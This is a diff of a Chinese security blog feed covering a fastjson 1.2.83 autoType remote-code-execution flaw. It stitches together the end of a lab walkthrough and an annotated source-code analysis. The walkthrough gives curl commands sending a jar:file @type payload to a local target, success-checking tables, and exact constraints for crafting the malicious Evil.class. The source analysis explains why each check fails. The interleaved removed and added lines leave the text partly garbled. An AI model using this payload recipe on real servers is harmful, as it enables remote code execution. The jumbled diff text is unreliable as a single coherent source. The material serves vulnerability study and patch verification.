-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;fjlab-18084&quot;</span> <span class="literal">-Direction</span> Inbound `</span><br><span class="line">  <span class="literal">-Protocol</span> TCP <span class="literal">-LocalPort</span> <span class="number">18084</span> <span class="literal">-Action</span> Allow <span class="literal">-Profile</span> Any</span><br><span class="line"><span class="comment"># 演示完删掉</span></span><br><span class="line"><span class="built_in">Remove-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;fjlab-18084&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>要理解的是：<strong>防火墙不是这条链的防线。</strong> 它只决定”包能不能进来”，不决定”进来之后 JVM 做什么”。所以哪怕把入站全封了，本机 <code>127.0.0.1</code> 打自己依然能弹计算器。</p>
-<h2 id="3-3-对照：同一个-payload-打-1-2-84"><a href="#3-3-对照：同一个-payload-打-1-2-84" class="headerlink" title="3.3 对照：同一个 payload 打 1.2.84"></a>3.3 对照：同一个 payload 打 1.2.84</h2><p>这是把”漏洞利用”和”文件落地”区分开的最直接证据——<strong>同一份 <code>C:\fj\f</code>、同一个请求体，只换 fastjson 版本</strong>。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /c/fj</span><br><span class="line">java -jar app-fixed.jar --server.port=18087 &gt; fixed.log 2&gt;&amp;1 &amp;</span><br><span class="line">curl -s http://127.0.0.1:18087/status; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
-
-<p>预期 <code>typeNameCheck</code> 变成 <code>present (1.2.84+)</code>。然后打：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /c/fj/rce-proof.txt</span><br><span class="line">curl -s -m 20 -X POST http://127.0.0.1:18087/parse \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.f!.Evil&quot;&#125;&#x27;</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
-
+<p>判定看三层，<strong>不要只看返回体</strong>：</p>
 <table>
 <thead>
 <tr>
-<th>实例</th>
-<th><code>/status</code></th>
-<th><code>/parse</code></th>
-<th>计算器</th>
-<th>证明文件</th>
-<th>绕过 fastjson 直调 loader</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1.2.83</td>
-<td><code>absent</code></td>
-<td><code>ok:true</code></td>
-<td>弹出</td>
-<td>生成</td>
-<td>可定义</td>
-</tr>
-<tr>
-<td>1.2.84</td>
-<td><code>present (1.2.84+)</code></td>
-<td><code>autoType is not support</code></td>
-<td>不弹</td>
-<td><strong>未生成</strong></td>
-<td><strong>仍可定义</strong></td>
-</tr>
-</tbody></table>
-<p>最后一行很关键：<strong>classloader 的解析能力没变，修复只加在 fastjson 入口</strong>。所以”换个 loader &#x2F; 换个部署形态”不构成缓解，升级 + 出站管控才是。</p>
-<blockquote>
-<p>判断是否已修复，**不要看 <code>JSON.VERSION</code>**——1.2.84 里这个常量仍然是 <code>&quot;1.2.83&quot;</code>。看依赖坐标，或看 <code>hasIllegalTypeNameChars</code> 方法在不在（<code>/status</code> 的 <code>typeNameCheck</code> 就是这么自查的）。</p>
-</blockquote>
-<h2 id="3-4-怎么判断成功：三层证据"><a href="#3-4-怎么判断成功：三层证据" class="headerlink" title="3.4 怎么判断成功：三层证据"></a>3.4 怎么判断成功：三层证据</h2><p>这个漏洞里，HTTP 200 和 <code>ok:true</code> 都不可靠，好几个”成功”的步骤返回的恰恰是报错。</p>
-<table>
-<thead>
-<tr>
-<th>层次</th>
-<th>看什么</th>
+<th>层</th>
+<th>命令 &#x2F; 现象</th>
 <th>说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>1. 命令跑没跑起来</td>
-<td><code>echo $?</code></td>
-<td><code>exit=0</code> 才说明命令本身没错；<code>28</code>&#x3D;超时，<code>7</code>&#x3D;端口没起</td>
+<td>连通</td>
+<td><code>exit=0</code></td>
+<td>命令本身没出错</td>
 </tr>
 <tr>
-<td>2. 动作有没有发生</td>
-<td>端口监听、对方日志、进程树</td>
-<td>证明链路走到哪一步</td>
+<td>探测</td>
+<td><code>stream:true</code>、<code>bytes:585</code>、<code>jsonTypeDirect:true</code></td>
+<td>字节读到了、注解被识别</td>
 </tr>
 <tr>
-<td>3. <strong>有没有留下副作用</strong></td>
-<td>证明文件、计算器进程</td>
+<td>副作用</td>
+<td>计算器进程出现、证明文件 mtime 变化</td>
 <td><strong>唯一不会骗人的判据</strong></td>
 </tr>
 </tbody></table>
-<p>每一段的判定点，以及那些”看起来失败、其实成功”的情况：</p>
+<p><code>ok:true</code> 只代表”类存在、实例创建成功”，不等于”代码刚执行过”。</p>
+<hr>
+<h2 id="7-五个硬约束"><a href="#7-五个硬约束" class="headerlink" title="7. 五个硬约束"></a>7. 五个硬约束</h2><ol>
+<li><strong>字节码版本必须是 52。</strong> 用 <code>--release 8</code>；<code>--release 11</code> 起在 JDK 8 目标上会 <code>UnsupportedClassVersionError</code>。</li>
+<li><strong>jar 条目名必须是根目录的 <code>Evil.class</code>。</strong> 1482 行拼的是 <code>typeName 还原 + &quot;.class&quot;</code>，多一层目录就对不上。</li>
+<li><strong><code>@type</code> 里除了协议头冒号，全部用点号。</strong><ul>
+<li>正确：<code>jar:file:.C:.fj.uploads.p!.Evil</code></li>
+<li>错误：<code>jar:file:.C:.fj.uploads.p!/Evil</code>（<code>checkAutoType</code> 判成不可解析）</li>
+</ul>
+</li>
+<li><strong><code>this_class</code> 必须等于 <code>@type</code> 还原后的类名</strong>（去掉 <code>.class</code>），逐字相同。</li>
+<li><strong>同一个类名只能执行一次。</strong> 第二次命中 <code>TypeUtils:1744</code> 缓存，<code>ok:true</code> 但静态块不再跑。换名字或重启靶机。</li>
+</ol>
+<hr>
+<h2 id="8-边界"><a href="#8-边界" class="headerlink" title="8. 边界"></a>8. 边界</h2><p>自有靶场、授权范围内使用。本文载荷只启动一个计算器并写一个证明文件，不含反弹 shell、不含持久化、不修改系统配置。对外分享时保持同样口径。</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>JAVA安全</category>
+        <category>Fastjson</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>关于CVE-2026-16723：fastjson 1.2.83 相关源码注解</title>
+    <url>/2026/11/10/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/SOURCE/</url>
+    <content><![CDATA[<h1 id="CVE-2026-16723：fastjson-1-2-83-源码注解"><a href="#CVE-2026-16723：fastjson-1-2-83-源码注解" class="headerlink" title="CVE-2026-16723：fastjson 1.2.83 源码注解"></a>CVE-2026-16723：fastjson 1.2.83 源码注解</h1><blockquote>
+<p>配套文档：<code>PAYLOAD.md</code>（载荷构造。本文只讲源码，以及它在哪一行消费载荷的字节）。<br>行号来自官方 <code>fastjson-1.2.83-sources.jar</code>，与 <code>com.alibaba.fastjson:fastjson:1.2.83</code> 二进制包一致。<br><code>★</code> 标记的位置，都是”载荷和源码的交点”。</p>
+</blockquote>
+<hr>
+<h2 id="1-阅读顺序"><a href="#1-阅读顺序" class="headerlink" title="1. 阅读顺序"></a>1. 阅读顺序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DefaultJSONParser:1764    @type 被读出来</span><br><span class="line">    ↓</span><br><span class="line">ParserConfig:1311         四道闸（SafeMode / 长度 / 首末字符哈希 / 黑名单哈希）</span><br><span class="line">    ↓</span><br><span class="line">ParserConfig:1479-1498    探测：把字符串当资源名去读 —— 缺陷所在</span><br><span class="line">    ↓</span><br><span class="line">ParserConfig:1500-1518    jsonType 为真 → 直接 return，跳过危险类加固</span><br><span class="line">    ↓</span><br><span class="line">TypeUtils:1735-1793       loadClass → 类加载器 → defineClass</span><br><span class="line">    ↓</span><br><span class="line">JVM 初始化类              &lt;clinit&gt; 执行</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="2-起点：-type-被读出来"><a href="#2-起点：-type-被读出来" class="headerlink" title="2. 起点：@type 被读出来"></a>2. 起点：<code>@type</code> 被读出来</h2><p><code>DefaultJSONParser.java:1764</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="comment">// ★ 1765：这里拿到的就是攻击者写的那个字符串，原样，没有任何字符过滤</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 1767：直接交给判定，typeName 从此往下传了 4 层，一路没被校验过</span></span><br><span class="line">    <span class="type">Class</span>&lt;?&gt; <span class="variable">clazz</span> <span class="operator">=</span> config.checkAutoType(typeName, <span class="literal">null</span>, lexer.getFeatures());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Map.class.isAssignableFrom(clazz)) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 1778：拿到 Class 之后立刻取反序列化器 —— 这一步会触发实例化，</span></span><br><span class="line">    <span class="comment">//         也就是类的&quot;首次主动使用&quot;，&lt;clinit&gt;（载荷里的 static 块）由此执行</span></span><br><span class="line">    <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> (Map) deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);   <span class="comment">// ★ 1788</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞入口不在 ParserConfig，而在这一行 <code>scanSymbol</code> 得到一个<strong>完全可控的字符串</strong>。后面所有问题，都建立在”这个字符串从来没被当成不可信输入”之上。</p>
+<hr>
+<h2 id="3-四道闸，全部在探测之前"><a href="#3-四道闸，全部在探测之前" class="headerlink" title="3. 四道闸，全部在探测之前"></a>3. 四道闸，全部在探测之前</h2><p><code>ParserConfig.java:1311</code> 起，按顺序排列：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">Class</span>&lt;?&gt; <span class="title function_">checkAutoType</span><span class="params">(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;                                    <span class="comment">// 1312</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 闸 1：SafeMode。开了就全禁，本漏洞无效（这是唯一真正管用的开关）</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">safeMode</span> <span class="operator">=</span> <span class="built_in">this</span>.safeMode</span><br><span class="line">            || (features &amp; safeModeMask) != <span class="number">0</span></span><br><span class="line">            || (JSON.DEFAULT_PARSER_FEATURE &amp; safeModeMask) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (safeMode) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;safeMode not support autoType : &quot;</span> + typeName);   <span class="comment">// 1330</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 闸 2：长度。3 &lt;= len &lt; 192</span></span><br><span class="line">    <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">192</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);          <span class="comment">// 1339</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);                        <span class="comment">// 1364</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 闸 3：首字符/末字符的哈希指纹，用来拦 &quot;[&quot; 开头的数组类型名</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (fnv1a_64_magic_hashcode ^ className.charAt(<span class="number">0</span>)) * fnv1a_64_magic_prime;</span><br><span class="line">    <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(...); &#125;      <span class="comment">// 1368</span></span><br><span class="line">    <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * fnv1a_64_magic_prime</span><br><span class="line">            == <span class="number">0x9198507b5af98f0L</span>) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(...); &#125;      <span class="comment">// 1372</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 闸 4：黑名单哈希。比对的是&quot;类名的哈希&quot;，</span></span><br><span class="line">    <span class="comment">//   而我们的类名是 jar URL，永远不可能命中任何已知恶意类名 —— 黑名单对本漏洞完全无效</span></span><br><span class="line">    <span class="keyword">if</span> (internalDenyHashCodes != <span class="literal">null</span>) &#123; ... &#125;                            <span class="comment">// 1386-1395</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123; ... denyHashCodes / acceptHashCodes ... &#125;      <span class="comment">// 1447-1477</span></span><br></pre></td></tr></table></figure>
+
+<p>四道闸一条都没拦住 <code>jar:file:...</code>：闸 1 没开、闸 2 长度合规、闸 3 只看首末字符、闸 4 比的是类名哈希而不是”名字里有没有 <code>:</code>“。</p>
+<blockquote>
+<p>这就是黑名单思路的局限：它枚举的是<strong>类的集合</strong>，而攻击者给的是一个<strong>路径字符串</strong>，两者不在同一维度。</p>
+</blockquote>
+<hr>
+<h2 id="4-核心缺陷：探测本身在加载"><a href="#4-核心缺陷：探测本身在加载" class="headerlink" title="4. 核心缺陷：探测本身在加载"></a>4. 核心缺陷：探测本身在加载</h2><p><code>ParserConfig.java:1479-1498</code>（全文最关键的 20 行）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">jsonType</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// ★ 1482：把用户字符串里的点号换回斜杠，再拼 .class</span></span><br><span class="line">    <span class="comment">//   输入 jar:file:.C:.fj.uploads.p!.Evil</span></span><br><span class="line">    <span class="comment">//   输出 jar:file:/C:/fj/uploads/p!/Evil.class   ← 一次合法的 jar URL</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (defaultClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// ★ 1484：本意是&quot;找同名资源&quot;，实际上 URLClassLoader 会把它当作 URL 打开</span></span><br><span class="line">        <span class="comment">//   这一步 = 任意路径读取 + SSRF 的全部来源</span></span><br><span class="line">        is = defaultClassLoader.getResourceAsStream(resource);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// ★ 1489：读到的字节被当成 class 解析（fastjson 内置的精简 ASM）</span></span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">TypeCollector</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(<span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">        classReader.accept(visitor);          <span class="comment">// ★ 1492</span></span><br><span class="line">        jsonType = visitor.hasJsonType();     <span class="comment">// ★ 1493：只看注解表里有没有 @JSONType</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="comment">// ★ 1494：全部异常静默丢弃 —— 探测阶段零日志，防守方看不到任何痕迹</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    IOUtils.close(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>三个失误叠在这 20 行里：</p>
 <table>
 <thead>
 <tr>
-<th>阶段</th>
-<th>成功证据</th>
-<th>假失败</th>
+<th>位置</th>
+<th>失误</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>起靶场</td>
-<td><code>vulnerable:true</code></td>
-<td>启动日志一大段，正常</td>
+<td>1482</td>
+<td>把”类名”当”资源路径”拼接，且没有字符白名单</td>
 </tr>
 <tr>
-<td>SSRF</td>
-<td>攻击者日志多出 <code>HEAD /probe.class</code></td>
-<td>返回 <code>autoType is not support</code> 是预期的</td>
+<td>1484</td>
+<td>用 <code>getResourceAsStream</code>（资源查找）代替”类名解析”，于是 URL 语义生效</td>
 </tr>
 <tr>
-<td>读字节</td>
-<td><code>stream=true</code>、<code>bytes</code> 非零</td>
-<td><code>checkAutoTypeError</code> 有值，说明只到探测</td>
-</tr>
-<tr>
-<td>改名前</td>
-<td><code>/rawload</code> 报 <code>(wrong name: Evil)</code></td>
-<td><strong>这条报错是最好的消息</strong></td>
-</tr>
-<tr>
-<td>落地</td>
-<td><code>ok:true</code> + 证明文件 + 进程存在</td>
-<td>——</td>
-</tr>
-<tr>
-<td>1.2.84 对照</td>
-<td><code>ok:false</code> + 证明文件不存在</td>
-<td>这里的”失败”正是修复生效</td>
+<td>1493</td>
+<td>信任判定取的是<strong>被检查对象自己声明</strong>的注解</td>
 </tr>
 </tbody></table>
-<h2 id="3-5-失败排查表"><a href="#3-5-失败排查表" class="headerlink" title="3.5 失败排查表"></a>3.5 失败排查表</h2><table>
+<p><strong>一句话</strong>：判断”是否可信”的动作，本身执行了一次文件加载。</p>
+<hr>
+<h2 id="5-拿到-jsonType-之后：直接放行"><a href="#5-拿到-jsonType-之后：直接放行" class="headerlink" title="5. 拿到 jsonType 之后：直接放行"></a>5. 拿到 <code>jsonType</code> 之后：直接放行</h2><p><code>ParserConfig.java:1500-1518</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;</span><br><span class="line">    <span class="comment">// ★ 1501：cacheClass 在 jsonType 为真时也是 true</span></span><br><span class="line">    <span class="comment">//   → 1763 行会把类名写进 mappings → 第二次同名请求命中缓存，不再执行 &lt;clinit&gt;</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 1502：typeName 原封不动传下去，注意这里传的是&quot;带冒号和感叹号&quot;的整串</span></span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (jsonType) &#123;</span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">            TypeUtils.addMapping(typeName, clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;                    <span class="comment">// ★ 1510：直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 1513-1517：1.2.x 后期补的&quot;危险类&quot;加固（ClassLoader / DataSource / RowSet）</span></span><br><span class="line">    <span class="comment">//   但只要 jsonType 为真，1510 行就 return 了，这三条永远不会执行到</span></span><br><span class="line">    <span class="comment">//   —— 这不是&quot;绕过&quot;，是走了另一条分支</span></span><br><span class="line">    <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz)</span><br><span class="line">            || javax.sql.DataSource.class.isAssignableFrom(clazz)</span><br><span class="line">            || javax.sql.RowSet.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>jsonType</code> 为 false 时的兜底（也就是”没加 <code>@JSONType</code>“的下场）：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName.endsWith(<span class="string">&quot;Exception&quot;</span>) || typeName.endsWith(<span class="string">&quot;Error&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);   <span class="comment">// ★ 1542</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这就是去掉注解后看到的那句报错，一字不差。</p>
+<hr>
+<h2 id="6-判定逻辑：全文只有一行有效代码"><a href="#6-判定逻辑：全文只有一行有效代码" class="headerlink" title="6. 判定逻辑：全文只有一行有效代码"></a>6. 判定逻辑：全文只有一行有效代码</h2><p><code>asm/TypeCollector.java</code>（108 行，只有这几行参与判定）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TypeCollector</span> &#123;</span><br><span class="line">    <span class="comment">// ★ 10：常量在类加载时就固定了，值就是那段描述符字符串</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JSONType</span> <span class="operator">=</span></span><br><span class="line">            ASMUtils.desc(com.alibaba.fastjson.annotation.JSONType.class);</span><br><span class="line">    <span class="comment">// 展开：&quot;Lcom/alibaba/fastjson/annotation/JSONType;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> jsonType;                      <span class="comment">// ★ 31：唯一的状态</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 71-75：ASM 回调，每遇到一个&quot;类级注解&quot;就调一次</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">void</span> <span class="title function_">visitAnnotation</span><span class="params">(String desc)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (JSONType.equals(desc)) &#123;</span><br><span class="line">            jsonType = <span class="literal">true</span>;         <span class="comment">// 只比字符串，不看来历、不看实现、不看加载器</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 106-108：checkAutoType 就是读它</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasJsonType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> jsonType;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>两个被实测证实的推论：</p>
+<ol>
+<li><strong>不需要真的 fastjson 注解类。</strong> 打出来的 jar 里只有 <code>Evil.class</code>，注解类没打包，照样通过。</li>
+<li><strong><code>RetentionPolicy.RUNTIME</code> 不能省。</strong> 否则描述符不进 <code>RuntimeVisibleAnnotations</code>，ASM 看不到。</li>
+</ol>
+<blockquote>
+<p>语义上的问题在这里：判断”你可不可信”的依据，来自你自己在文件里写的一行声明。</p>
+</blockquote>
+<hr>
+<h2 id="7-命名校验：为什么必须改-this-class"><a href="#7-命名校验：为什么必须改-this-class" class="headerlink" title="7. 命名校验：为什么必须改 this_class"></a>7. 命名校验：为什么必须改 <code>this_class</code></h2><p><code>TypeUtils.java:1735</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Class</span>&lt;?&gt; <span class="title function_">loadClass</span><span class="params">(String className, ClassLoader classLoader, <span class="type">boolean</span> cache)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;        <span class="comment">// 1736</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className.length() &gt; <span class="number">198</span>) &#123;                                       <span class="comment">// 1740</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;illegal className : &quot;</span> + className);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 1744：类缓存。第二次同名请求在这里就返回了，defineClass 不会再执行</span></span><br><span class="line">    <span class="type">Class</span>&lt;?&gt; <span class="variable">clazz</span> <span class="operator">=</span> mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// ★ 1761：className 就是那串 jar URL，原样交给类加载器</span></span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);   <span class="comment">// ★ 1763：类名 → Class 映射</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        e.printStackTrace();      <span class="comment">// ★ 1768：唯一的&quot;真相窗口&quot;，靶场 /rawload 就是抓这里</span></span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终走到 JVM：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">defineClass(<span class="string">&quot;jar:file:/C:/fj/uploads/p!/Evil&quot;</span>, bytes, <span class="number">0</span>, bytes.length);</span><br></pre></td></tr></table></figure>
+
+<p>JVM 强制校验：<strong>传入的 <code>name</code> 必须与 class 文件 <code>this_class</code> 自称的名字逐字相同</strong>。否则：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">NoClassDefFoundError: jar:file:/C:/fj/uploads/p!/Evil (wrong name: Evil)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这条规则来自 JVM 规范，不是 fastjson 的要求。所以改的是<strong>字节</strong>：源码里写 <code>public class Evil</code>，编译出来必然自称 <code>Evil</code>，只能事后改常量池。</p>
+</blockquote>
+<hr>
+<h2 id="8-为什么第二次不执行"><a href="#8-为什么第二次不执行" class="headerlink" title="8. 为什么第二次不执行"></a>8. 为什么第二次不执行</h2><p>三行代码就够了：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;               <span class="comment">// 1501：jsonType 为真 → cache=true</span></span><br><span class="line">clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);   <span class="comment">// 1502</span></span><br><span class="line">mappings.put(className, clazz);                                 <span class="comment">// 1763：写进缓存</span></span><br></pre></td></tr></table></figure>
+
+<p>下一次同名请求：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span>&lt;?&gt; <span class="variable">clazz</span> <span class="operator">=</span> mappings.get(className);   <span class="comment">// 1744：命中</span></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) <span class="keyword">return</span> clazz;            <span class="comment">// 1745：直接返回，defineClass 不再执行</span></span><br></pre></td></tr></table></figure>
+
+<p>于是 <code>ok:true</code> 但静态块不跑。<strong>这是 fastjson 的正常行为，不是载荷坏了。</strong></p>
+<hr>
+<h2 id="9-1-2-84-修在哪里"><a href="#9-1-2-84-修在哪里" class="headerlink" title="9. 1.2.84 修在哪里"></a>9. 1.2.84 修在哪里</h2><p>官方在 <code>checkAutoType</code> 入口、长度校验（1338 行）旁边新增了字符检查：</p>
